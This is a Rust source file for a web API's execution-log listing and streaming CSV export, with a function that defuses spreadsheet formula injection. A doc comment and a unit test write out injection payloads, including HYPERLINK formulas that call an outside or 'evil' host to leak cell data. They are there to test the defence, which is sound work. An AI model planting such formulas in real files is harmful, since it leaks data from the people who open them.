//! Execution log browsing and export.

use super::{Json, Query};
use axum::extract::State;
use axum::http::{HeaderMap, HeaderValue, header};
use axum::response::IntoResponse;
use serde::{Deserialize, Serialize};
use sqlx::AssertSqlSafe;

use crate::api::auth::Identity;
use crate::api::{Page, paginate};
use crate::error::AppResult;
use crate::state::AppState;

#[derive(Debug, Serialize, sqlx::FromRow, utoipa::ToSchema)]
pub struct LogEntry {
    pub id: String,
    /// The proposal the write carried out.
    pub decision_id: Option<String>,
    /// `move`, or `revert` for a move taken back. An open list.
    pub action: String,
    /// Where the title went, from and to.
    pub details: Option<String>,
    /// Whether the Arr took the write.
    pub success: bool,
    /// Why it did not, a sentence for a person.
    pub error_message: Option<String>,
    pub instance_id: Option<String>,
    pub media_id: Option<String>,
    /// The title as it read when it moved.
    pub media_title: Option<String>,
    /// What set the write off: `manual`, `schedule`, `webhook`, `api` for an
    /// application key, or `auto` for a move the automation applied.
    pub actor: Option<String>,
    /// Who asked, when the mode vouched for a name, or the application key's
    /// name. An application key reads its own name here and `null` for anyone
    /// else's.
    pub subject: Option<String>,
    #[serde(skip)]
    pub subject_key: Option<String>,
    /// When the write was made, in UTC.
    pub executed_at: String,
}

/// One page of the log.
#[derive(Debug, Default, Deserialize, utoipa::IntoParams)]
#[into_params(parameter_in = Query)]
#[serde(deny_unknown_fields)]
pub struct LogQuery {
    /// Only the writes on this instance.
    pub instance_id: Option<String>,
    /// Only the writes of this title.
    pub media_id: Option<String>,
    /// `move` or `revert`.
    pub action: Option<String>,
    /// Only the writes the Arr took, or only those it did not.
    pub success: Option<bool>,
    /// Text in the title or the details.
    pub search: Option<String>,
    /// From 1. Defaults to 1.
    pub page: Option<u32>,
    /// From 1 to 200. Defaults to 50.
    pub per_page: Option<u32>,
}

/// What the export is filtered by: the filters of a page, without the paging.
// Its own fields rather than flattened into `LogQuery`: a flattened query
// reads every value as text, and `success` no longer parses.
#[derive(Debug, Default, Deserialize, utoipa::IntoParams)]
#[into_params(parameter_in = Query)]
#[serde(deny_unknown_fields)]
pub struct LogFilter {
    /// Only the writes on this instance.
    pub instance_id: Option<String>,
    /// Only the writes of this title.
    pub media_id: Option<String>,
    /// `move` or `revert`.
    pub action: Option<String>,
    /// Only the writes the Arr took, or only those it did not.
    pub success: Option<bool>,
    /// Text in the title or the details.
    pub search: Option<String>,
}

impl LogQuery {
    fn filter(&self) -> LogFilter {
        LogFilter {
            instance_id: self.instance_id.clone(),
            media_id: self.media_id.clone(),
            action: self.action.clone(),
            success: self.success,
            search: self.search.clone(),
        }
    }
}

const COLUMNS: &str = "id, decision_id, action, details, success, error_message,
     instance_id, media_id, media_title, actor, subject, subject_key, executed_at";

pub async fn list(
    State(state): State<AppState>,
    axum::Extension(identity): axum::Extension<Identity>,
    Query(query): Query<LogQuery>,
) -> AppResult<Json<Page<LogEntry>>> {
    let (page, per_page, offset) = paginate(query.page, query.per_page);
    let (filters, binds) = build_filters(&query.filter());

    let list_sql = format!(
        "SELECT {COLUMNS} FROM execution_logs WHERE 1=1{filters}
         ORDER BY executed_at DESC, id DESC LIMIT ? OFFSET ?"
    );
    let count_sql = format!("SELECT COUNT(*) FROM execution_logs WHERE 1=1{filters}");

    let mut list_query = sqlx::query_as::<_, LogEntry>(AssertSqlSafe(list_sql.as_str()));
    let mut count_query = sqlx::query_scalar::<_, i64>(AssertSqlSafe(count_sql.as_str()));
    for bind in &binds {
        list_query = list_query.bind(bind);
        count_query = count_query.bind(bind);
    }

    let entries = list_query.bind(per_page).bind(offset).fetch_all(&state.pool).await?;
    let total = count_query.fetch_one(&state.pool).await?;

    Ok(Json(Page::new(shown(&identity, entries), page, per_page, total)))
}

/// The rows an export holds at most, the newest.
const EXPORTED_AT_MOST: i64 = 50_000;

/// Set on an export that holds [`EXPORTED_AT_MOST`] rows of a longer log.
const TRUNCATED: header::HeaderName = header::HeaderName::from_static("x-routarr-truncated");

/// Download the filtered log as CSV, written as it is read: a whole log held
/// in memory before the first byte leaves would cost its size on every call.
pub async fn export(
    State(state): State<AppState>,
    axum::Extension(identity): axum::Extension<Identity>,
    Query(filter): Query<LogFilter>,
) -> AppResult<impl IntoResponse> {
    let (filters, binds) = build_filters(&filter);
    let count_sql = format!("SELECT COUNT(*) FROM execution_logs WHERE 1=1{filters}");
    let mut count_query = sqlx::query_scalar::<_, i64>(AssertSqlSafe(count_sql.as_str()));
    for bind in &binds {
        count_query = count_query.bind(bind);
    }
    let truncated = count_query.fetch_one(&state.pool).await? > EXPORTED_AT_MOST;

    let (sender, body) = futures::channel::mpsc::channel(4);
    tokio::spawn(write_csv(state.pool.clone(), identity, filters, binds, sender));

    let mut headers = HeaderMap::new();
    headers.insert(header::CONTENT_TYPE, HeaderValue::from_static("text/csv; charset=utf-8"));
    headers.insert(
        header::CONTENT_DISPOSITION,
        HeaderValue::from_static("attachment; filename=\"routarr-logs.csv\""),
    );
    if truncated {
        headers.insert(TRUNCATED, HeaderValue::from_static("true"));
    }
    Ok((headers, axum::body::Body::from_stream(body)))
}

/// The rows an export reads at a time. The connection goes back to the pool
/// between two reads, so a client reading slowly holds none while it reads.
const EXPORT_PAGE: i64 = 1_000;

type Chunk = Result<String, std::io::Error>;

/// The export's rows as CSV, a page at a time, newest first, until the reader
/// goes away. Each page starts after the last row sent, so a row written
/// meanwhile is neither sent twice nor shifts what follows. A failed read ends
/// the body in an error, which the client sees as a cut download rather than
/// a file that looks whole.
async fn write_csv(
    pool: sqlx::SqlitePool,
    identity: Identity,
    filters: String,
    binds: Vec<String>,
    mut sender: futures::channel::mpsc::Sender<Chunk>,
) {
    use futures::SinkExt;
    let mut chunk = String::from(
        "executed_at,action,actor,subject,success,media_title,details,error_message\n",
    );
    let mut last: Option<(String, String)> = None;
    let mut written = 0;
    while written < EXPORTED_AT_MOST {
        let limit = EXPORT_PAGE.min(EXPORTED_AT_MOST - written);
        let after = match last {
            Some(_) => " AND (executed_at < ? OR (executed_at = ? AND id < ?))",
            None => "",
        };
        let sql = format!(
            "SELECT {COLUMNS} FROM execution_logs WHERE 1=1{filters}{after}
             ORDER BY executed_at DESC, id DESC LIMIT {limit}"
        );
        let mut query = sqlx::query_as::<_, LogEntry>(AssertSqlSafe(sql.as_str()));
        for bind in &binds {
            query = query.bind(bind);
        }
        if let Some((at, id)) = &last {
            query = query.bind(at).bind(at).bind(id);
        }
        let page = match query.fetch_all(&pool).await {
            Ok(page) => page,
            Err(e) => {
                tracing::error!("The log export could not be read: {e}");
                let _ = sender.send(Err(std::io::Error::other("the log could not be read"))).await;
                return;
            }
        };
        let read = page.len() as i64;
        written += read;
        last = page.last().map(|entry| (entry.executed_at.clone(), entry.id.clone()));
        for entry in page {
            let subject = identity.shown_subject(entry.subject, entry.subject_key.as_deref());
            chunk.push_str(&format!(
                "{},{},{},{},{},{},{},{}\n",
                csv_field(&entry.executed_at),
                csv_field(&entry.action),
                csv_field(entry.actor.as_deref().unwrap_or("")),
                csv_field(subject.as_deref().unwrap_or("")),
                entry.success,
                csv_field(entry.media_title.as_deref().unwrap_or("")),
                csv_field(entry.details.as_deref().unwrap_or("")),
                csv_field(entry.error_message.as_deref().unwrap_or("")),
            ));
        }
        if sender.send(Ok(std::mem::take(&mut chunk))).await.is_err() || read < limit {
            return;
        }
    }
}

/// The entries as `identity` may read them: an application key reads its own
/// name in `subject` and no one else's, as on every list that carries one.
fn shown(identity: &Identity, entries: Vec<LogEntry>) -> Vec<LogEntry> {
    entries
        .into_iter()
        .map(|entry| LogEntry {
            subject: identity.shown_subject(entry.subject, entry.subject_key.as_deref()),
            ..entry
        })
        .collect()
}

fn build_filters(query: &LogFilter) -> (String, Vec<String>) {
    let mut filters = String::new();
    let mut binds = Vec::new();

    if let Some(v) = &query.instance_id {
        filters.push_str(" AND instance_id = ?");
        binds.push(v.clone());
    }
    if let Some(v) = &query.media_id {
        filters.push_str(" AND media_id = ?");
        binds.push(v.clone());
    }
    if let Some(v) = &query.action {
        filters.push_str(" AND action = ?");
        binds.push(v.clone());
    }
    if let Some(v) = query.success {
        filters.push_str(" AND success = ?");
        binds.push(if v { "1".into() } else { "0".into() });
    }
    if let Some(v) = &query.search {
        filters.push_str(" AND (media_title LIKE ? ESCAPE '\\' OR details LIKE ? ESCAPE '\\')");
        binds.push(format!("%{}%", crate::db::escape_like(v)));
        binds.push(format!("%{}%", crate::db::escape_like(v)));
    }

    (filters, binds)
}

/// Quote a field, and stop a spreadsheet from executing it.
///
/// The quoting is RFC 4180 and the obvious half: log details carry file paths
/// and upstream error bodies, and an unescaped comma or newline would shift
/// every following column. The other half is that a cell whose first character
/// is `=`, `+`, `-`, `@`, a tab or a carriage return is a
/// *formula* to Excel, LibreOffice and Sheets: they strip the quotes and then
/// evaluate, so escaping does not help. `=HYPERLINK("http://…"&A1,"click")` in
/// a media title would fire the moment the operator opens the export.
///
/// The titles here come from the Arrs, which get them from public metadata
/// databases and from filenames: nothing the operator wrote and nothing this
/// application validates. A leading apostrophe is the standard defusal: the
/// spreadsheet reads the rest as text and does not display the quote.
pub(crate) fn csv_field(value: &str) -> String {
    let escaped = value.replace('"', "\"\"").replace(['\n', '\r'], " ");
    let escaped = match escaped.chars().next() {
        Some('=' | '+' | '-' | '@' | '\t') => format!("'{escaped}"),
        _ => escaped,
    };
    format!("\"{escaped}\"")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn quotes_and_escapes_fields() {
        assert_eq!(csv_field(r#"a,b"#), r#""a,b""#);
        assert_eq!(csv_field(r#"say "hi""#), r#""say ""hi""""#);
        assert_eq!(csv_field("line1\nline2"), r#""line1 line2""#);
    }

    /// A media title is not something this application wrote: it arrives from
    /// the Arrs, which take it from public metadata or from a filename.
    #[test]
    fn a_field_that_would_be_a_formula_is_defused() {
        for hostile in
            [r#"=HYPERLINK("http://evil","click")"#, "+1+1", "-2+3", "@SUM(A1)", "\tleading tab"]
        {
            let field = csv_field(hostile);
            assert!(field.starts_with("\"'"), "a spreadsheet would evaluate this: {field}");
        }

        // And an ordinary title is untouched: the defusal must not put an
        // apostrophe in front of every row.
        assert_eq!(csv_field("Akira"), r#""Akira""#);
        assert_eq!(csv_field("2 Fast 2 Furious"), r#""2 Fast 2 Furious""#);
    }
}
